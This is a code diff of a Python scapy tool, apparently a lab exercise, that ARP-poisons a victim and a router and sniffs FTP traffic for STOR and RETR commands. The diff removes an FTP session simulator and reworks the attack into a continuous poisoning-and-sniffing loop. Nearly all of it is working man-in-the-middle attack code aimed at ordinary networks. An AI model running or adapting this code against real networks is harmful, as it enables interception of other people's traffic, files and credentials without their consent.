@@ -7,48 +7,8 @@ import argparse
 import logging
 import threading
 import ftplib
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
-def ftp_session(host):
-    print("[SIMULATOR] Starting FTP session simulation in 5 seconds...")
-    time.sleep(5)
-
-    user = "odana"
-    password = "not_a_password"
-
-    try:
-        ftp = ftplib.FTP(host, timeout=5)
-        print("[SIMULATOR] Connected to FTP server at", host)
-
-        ftp.login(user, password)
-        print("[SIMULATOR] Logged in as", user)
-
-        time.sleep(0.5)
-
-        download = "classified.zip"
-        file_stream_download = BytesIO()
-        print("[SIMULATOR] Sending RETR command for", download)
-        ftp.retrbinary("RETR " + download, file_stream_download.write)
-
-        time.sleep(0.5)
-
-        upload = "log.txt"
-        file_stream_upload = BytesIO()
-        print("[SIMULATOR] Sending STOR command for", download)
-        ftp.retrbinary("STOR " + download, file_stream_upload.write)
-
-        time.sleep(0.5)
-
-        ftp.quit()
-        print("[SIMULATOR] Session complete.")
-
-    except ftplib.all_errors as e:
-        print("[SIMULATOR] Failed to connect/send commands")
-        print("[SIMULATOR] ERROR:", e)
-    except Exception as e:
-        print("[SIMULATOR] ERROR:", e)
-
-
 
 def restore_arp():
     print("[ARP POISONER] Restoring ARP tables...")
@@ -89,15 +49,8 @@ def arp_poison():
         hwdst=ROUTER_MAC,
         hwsrc=ATTACKER_MAC
     )
-    try:
-        while True:
-            send(poison_victim, verbose=False)
-            send(poison_router, verbose=False)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("\n[ARP POISONER] Stopping attack..")
-        time.sleep(1)
-        restore_arp()
+    send(poison_victim, verbose=False)
+    send(poison_router, verbose=False)
 
 def sniff_sniff(packet):
     if packet.haslayer('TCP'):
@@ -111,6 +64,9 @@ def process_packet(packet):
     if packet.haslayer('Raw'):
         payload = packet['Raw'].load.decode('utf-8').strip()
 
+        if not payload:
+            return
+        
         if payload.startswith('STOR ') or payload.startswith('RETR '):
                 parts = payload.split(' ', 1)
                 command = parts[0]
@@ -132,21 +88,21 @@ def process_packet(packet):
 
 
 def attack():
-    poison_thread = threading.Thread(target=arp_poison)
-    poison_thread.daemon = True
-    poison_thread.start()
 
-    simulation_thread = threading.Thread(target=ftp_session, args=(ROUTER_IP,))
-    simulation_thread.daemon = True
-    simulation_thread.start()
+    for i in range(5):
+        arp_poison()
+        time.sleep(0.5)
 
     print("[SNIFFER] Starting packet sniffing...")
-    sniff(
-        filter="tcp port 21 and host " + VICTIM_IP + " and host " + ROUTER_IP,
-        prn=sniff_sniff,
-        store=0,
-        iface="eth0"
-    )
+    try:
+        sniff(
+            filter="tcp port 21 and host " + VICTIM_IP + " and host " + ROUTER_IP,
+            prn=sniff_sniff,
+            store=0,
+            iface="eth0"
+        )
+    except KeyboardInterrupt:
+        pass
 
 parser = argparse.ArgumentParser()
 
@@ -166,17 +122,18 @@ VICTIM_MAC = args.victim_mac    # 62:b6:ac:8f:57:be
 
 ATTACKER_MAC = get_if_hwaddr("eth0")
 
-if __name__ == "__main__":
-    try:
+try:
+    while True:
         attack()
-    except KeyboardInterrupt:
-        print("\nCaught KeyboardInterrupt. Initiating cleanup...")
-        restore_arp()
-        exit(0)
-    except Exception as e:
-        print(f"\n[FATAL ERROR] {e}")
-        restore_arp()
-        exit(1)
+        arp_poison()
+except KeyboardInterrupt:
+    print("\nStopped. Initiating cleanup...")
+    restore_arp()
+    exit(0)
+except Exception as e:
+    print(f"\n[FATAL ERROR] {e}")
+    restore_arp()
+    exit(1)
 
 
 
